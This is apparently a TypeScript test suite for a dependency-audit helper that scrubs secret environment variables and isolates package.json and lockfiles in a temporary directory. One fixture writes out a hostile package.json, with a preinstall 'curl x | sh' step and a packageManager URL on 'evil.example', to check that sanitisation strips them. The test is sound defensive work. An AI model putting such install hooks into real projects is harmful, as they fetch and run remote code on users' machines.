import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import { auditEnv, prepareAuditDir } from '../../scripts/security/lib/audit-run.ts'

describe('auditEnv', () => {
  it('只含 PATH、HOME、CI、npm_config_ignore_scripts 與 corepack 防護旗標', () => {
    const env = auditEnv({
      BEACON_SECRET: 's', ANTHROPIC_FEDERATION_RULE_ID: 'f', ACTIONS_ID_TOKEN_REQUEST_TOKEN: 't',
      GCP_PROJECT: 'p', PATH: '/usr/bin', HOME: '/home/x',
    })
    expect(Object.keys(env).sort()).toEqual([
      'CI', 'COREPACK_ENABLE_PROJECT_SPEC', 'COREPACK_ENABLE_STRICT', 'HOME', 'PATH', 'npm_config_ignore_scripts',
    ])
    expect(env.COREPACK_ENABLE_STRICT).toBe('0')
    expect(env.COREPACK_ENABLE_PROJECT_SPEC).toBe('0')
    expect(env.CI).toBe('true')
    expect(env.npm_config_ignore_scripts).toBe('true')
  })
  it('PATH／HOME 不存在就省略', () => {
    expect(Object.keys(auditEnv({ BEACON_SECRET: 's' })).sort()).toEqual([
      'CI', 'COREPACK_ENABLE_PROJECT_SPEC', 'COREPACK_ENABLE_STRICT', 'npm_config_ignore_scripts',
    ])
  })
})

describe('prepareAuditDir', () => {
  let repo: string
  const made: string[] = []
  beforeEach(() => {
    repo = fs.mkdtempSync(path.join(os.tmpdir(), 'audit-src-'))
  })
  afterEach(() => {
    for (const d of [repo, ...made.splice(0)]) fs.rmSync(d, { recursive: true, force: true })
  })
  const put = (n: string, c = '{}') => fs.writeFileSync(path.join(repo, n), c)

  it('暫存目錄內恰有 package.json 與 lockfile 兩個檔', () => {
    put('package.json', '{}')
    for (const n of ['pnpm-lock.yaml', '.npmrc', '.pnpmfile.cjs', 'pnpm-workspace.yaml']) put(n)
    const dir = prepareAuditDir(repo, 'pnpm')
    made.push(dir)
    expect(dir.startsWith(repo)).toBe(false)
    expect(fs.readdirSync(dir).sort()).toEqual(['package.json', 'pnpm-lock.yaml'])
  })
  it('package.json 淨化：只保留 name／version／private 與合法的 dependencies 類鍵', () => {
    put('package.json', JSON.stringify({
      name: 'evil', version: '9.9.9',
      packageManager: 'pnpm@https://evil.example/pnpm.tgz',
      scripts: { preinstall: 'curl x | sh' },
      pnpm: { overrides: { a: '1' } }, overrides: { a: '1' }, engines: { node: '1' },
      dependencies: { left: '^1.0.0' },
      devDependencies: { right: 5 },
      optionalDependencies: { opt: '2.0.0' },
    }))
    put('pnpm-lock.yaml')
    const dir = prepareAuditDir(repo, 'pnpm')
    made.push(dir)
    const out = JSON.parse(fs.readFileSync(path.join(dir, 'package.json'), 'utf8'))
    expect(Object.keys(out).sort()).toEqual(['dependencies', 'name', 'optionalDependencies', 'private', 'version'])
    expect(out.name).toBe('audit-target')
    expect(out.version).toBe('0.0.0')
    expect(out.private).toBe(true)
    expect(out.dependencies).toEqual({ left: '^1.0.0' })
  })
  it('package.json 不是合法 JSON → throw 並清掉暫存目錄', () => {
    put('package.json', '{ nope'); put('pnpm-lock.yaml')
    expect(() => prepareAuditDir(repo, 'pnpm')).toThrow()
  })
  it('package.json 超過 1 MB → throw', () => {
    put('package.json', JSON.stringify({ dependencies: {}, pad: 'x'.repeat(1024 * 1024) })); put('pnpm-lock.yaml')
    expect(() => prepareAuditDir(repo, 'pnpm')).toThrow()
  })
  it('lockfile 超過 20 MB → throw', () => {
    put('package.json', '{}'); put('pnpm-lock.yaml', 'x'.repeat(20 * 1024 * 1024 + 1))
    expect(() => prepareAuditDir(repo, 'pnpm')).toThrow()
  })
  it('npm 複製 package-lock.json', () => {
    put('package.json', '{}'); put('package-lock.json')
    const dir = prepareAuditDir(repo, 'npm')
    made.push(dir)
    expect(fs.readdirSync(dir).sort()).toEqual(['package-lock.json', 'package.json'])
  })
  it('lockfile 是 symlink → throw', () => {
    put('package.json', '{}'); put('real.yaml')
    fs.symlinkSync(path.join(repo, 'real.yaml'), path.join(repo, 'pnpm-lock.yaml'))
    expect(() => prepareAuditDir(repo, 'pnpm')).toThrow()
  })
  it('缺 package.json → throw', () => {
    put('pnpm-lock.yaml')
    expect(() => prepareAuditDir(repo, 'pnpm')).toThrow()
  })
})
